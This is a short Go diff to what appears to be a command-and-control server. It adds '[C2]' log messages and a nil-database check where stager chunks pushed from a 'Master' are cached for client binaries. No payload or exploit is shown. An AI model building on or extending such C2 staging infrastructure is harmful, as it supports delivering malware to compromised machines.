@@ -598,14 +598,24 @@ func main() {
 		}
 	}, func(cacheTasks []StagerCacheTask) {
 		// Handle stager cache tasks pushed from Master
+		if len(cacheTasks) > 0 {
+			logf("[C2] 📥 Received %d stager cache task(s) from Master", len(cacheTasks))
+		}
+
 		for _, task := range cacheTasks {
-			logf("[Cache] Received stager chunks for %s (%d chunks)", task.ClientBinaryID, task.TotalChunks)
+			logf("[C2] 📦 Processing cache: %s (%d chunks, %d bytes total)",
+				task.ClientBinaryID, task.TotalChunks, len(task.Chunks))
 
 			// Cache all chunks in local database
+			if c2Manager.db == nil {
+				logf("[C2] ⚠️  ERROR: Database is nil, cannot cache chunks!")
+				continue
+			}
+
 			if err := c2Manager.db.CacheStagerChunks(task.ClientBinaryID, task.Chunks); err != nil {
-				logf("[Cache] ⚠️  Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
+				logf("[C2] ❌ Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
 			} else {
-				logf("[Cache] ✅ Cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
+				logf("[C2] ✅ Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
 			}
 		}
 	})
